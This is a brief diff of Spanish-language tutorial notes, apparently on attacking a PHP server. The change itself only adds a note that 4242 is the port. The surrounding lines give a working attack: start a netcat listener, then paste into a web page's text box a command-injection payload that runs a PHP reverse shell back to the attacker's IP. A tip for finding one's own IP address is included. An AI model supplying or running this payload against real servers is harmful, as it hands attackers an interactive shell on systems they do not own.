@@ -3,7 +3,7 @@
 
 ++ Ejemplo #1 (Servidor PHP)
 --- En la terminal ejecutar el siguiente comando:
---- nc -lvp 4242
+--- nc -lvp 4242 (Nota: 4242 hace referencia al puerto)
 --- En la página asociada al servidor en algún textbox pegar el siguiente comando:
 --- <url>;php -r '$sock=fsockopen("<nuestra_ip>",<puerto, en este caso: 4242>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ----- Para conocer nuestra ip podemos usar el siguiente comando en la terminal: ip addr show 
